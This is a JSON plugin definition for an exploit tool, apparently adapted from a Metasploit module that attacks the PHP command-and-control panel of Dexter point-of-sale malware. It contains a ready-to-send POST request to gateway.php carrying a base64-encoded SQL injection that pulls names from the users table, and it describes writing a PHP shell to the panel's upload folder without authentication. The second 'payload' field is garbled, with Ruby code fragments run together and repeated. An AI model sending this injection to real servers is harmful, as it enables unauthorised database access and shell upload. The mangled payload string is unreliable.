{
   "users" : "name",
   "detection" : {},
   "informations" : {
      "METHOD" : "POST",
      "TITLE OF PANEL LOGIN PAGE" : "index.php",
      "PATHS" : [
         ""
      ],
      "TYPE" : "MSF",
      "PLATFORM" : "MULTI",
      "VARIABLES" : {
         "TARGETDATABASEUSERTABLE" : {
            "VALUE" : "users",
            "DESCRIPTION" : "Table in database that holds admin data"
         },
         "PASSWORD" : {
            "DESCRIPTION" : "",
            "VALUE" : ""
         },
         "USERNAME" : {
            "VALUE" : "",
            "DESCRIPTION" : ""
         },
         "PATH" : {
            "VALUE" : "/",
            "DESCRIPTION" : "The path to the CasinoLoader root folder"
         }
      },
      "TITLE OF BOT GATEWAY PAGE" : "gateway.php",
      "MSF_MODULE" : "dexter_casinoloader_exec",
      "USERS" : "name",
      "TITLE OF PANEL UPLOAD PAGE" : "upload.php",
      "DESCRIPTION" : "\n\n          This module exploits a vulnerability found in the command and control panel\n\n        used to control Dexter (Point of Sale malware).  This is done by accessing the\n\n        PHP page used by bots to report in (gateway.php) which does not sanitize input.\n\n        Input is encrypted and encoded, but the key is supplied by the bot connecting.\n\n        The 'page' parameter is used in this case.  The command and control panel designates\n\n        a location to upload files, and can be used as a reliable location to write a\n\n        PHP shell.  Authentication is not needed to exploit this vulnerability.\n\n      ",
      "REQUESTS" : {
         "EXPLOIT1" : {
            "METHOD" : "POST",
            "PATH" : "gateway.php",
            "VALIDATION" : {
               "TCODE" : [
                  "200"
               ]
            },
            "HEADERS" : {
               "Content-Type" : "application/x-www-form-urlencoded"
            },
            "PAYLOAD" : "val=AA%3d%3d&page=JyBBTkQgMT0yIFVOSU9OIEFMTCBTRUxFQ1QgMSxuYW1lLDMgRlJPTSB1c2VycyBMSU1JVCAxIE9GRlNFVCAwIC0tIC0t",
            "TEXT" : "Sending Exploit #1 Request : [POST] /gateway.php"
         }
      },
      "name" : "DexterCasinoloaderExec",
      "PAYLOAD" : "val=AA==&page=Rex::Text.encode_base64(AND1=2UNIONALLSELECT1&val=AA==&page=Rex::Text.encode_base64(AND1=2UNIONALLSELECT1&submit=1&username=__USERNAME__&password=__PASSWORD__&"
   },
   "title of panel upload page" : "upload.php",
   "title of bot gateway page" : "gateway.php",
   "title of panel login page" : "index.php",
   "plugins_directory" : "/home/evil/GIT/Exploits/../data/plugins/",
   "type" : "MSF",
   "paths" : [
      ""
   ],
   "requests" : {
      "EXPLOIT1" : {
         "METHOD" : "POST",
         "PATH" : "gateway.php",
         "VALIDATION" : {
            "TCODE" : [
               "200"
            ]
         },
         "HEADERS" : {
            "Content-Type" : "application/x-www-form-urlencoded"
         },
         "PAYLOAD" : "val=AA%3d%3d&page=JyBBTkQgMT0yIFVOSU9OIEFMTCBTRUxFQ1QgMSxuYW1lLDMgRlJPTSB1c2VycyBMSU1JVCAxIE9GRlNFVCAwIC0tIC0t",
         "TEXT" : "Sending Exploit #1 Request : [POST] /gateway.php"
      }
   },
   "msf_module" : "dexter_casinoloader_exec",
   "name" : "DexterCasinoloaderExec",
   "payload" : "val=AA==&page=Rex::Text.encode_base64(AND1=2UNIONALLSELECT1&val=AA==&page=Rex::Text.encode_base64(AND1=2UNIONALLSELECT1&submit=1&username=__USERNAME__&password=__PASSWORD__&",
   "variables" : {
      "TARGETDATABASEUSERTABLE" : {
         "VALUE" : "users",
         "DESCRIPTION" : "Table in database that holds admin data"
      },
      "PASSWORD" : {
         "DESCRIPTION" : "",
         "VALUE" : ""
      },
      "PATH" : {
         "VALUE" : "/",
         "DESCRIPTION" : "The path to the CasinoLoader root folder"
      },
      "USERNAME" : {
         "VALUE" : "",
         "DESCRIPTION" : ""
      }
   },
   "description" : "\n\n          This module exploits a vulnerability found in the command and control panel\n\n        used to control Dexter (Point of Sale malware).  This is done by accessing the\n\n        PHP page used by bots to report in (gateway.php) which does not sanitize input.\n\n        Input is encrypted and encoded, but the key is supplied by the bot connecting.\n\n        The 'page' parameter is used in this case.  The command and control panel designates\n\n        a location to upload files, and can be used as a reliable location to write a\n\n        PHP shell.  Authentication is not needed to exploit this vulnerability.\n\n      ",
   "method" : "POST",
   "platform" : "MULTI"
}
